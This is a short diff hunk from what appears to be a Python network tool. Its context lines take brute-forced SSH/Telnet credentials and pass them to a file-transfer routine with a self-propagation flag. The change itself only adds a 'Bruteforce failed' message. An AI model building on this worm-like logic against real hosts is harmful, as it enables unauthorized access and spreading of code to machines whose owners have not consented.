@@ -105,6 +105,8 @@ def main():
                         if deploy_file and not deployed and (port == 22 or port == 23):
                             credentials = username_password.split(":")
                             deployed = transfer_file(ip, credentials[0], credentials[1], port, self_propagate)
+                    else:
+                        print("Bruteforce failed")
                 except KeyError:
                     pass
 
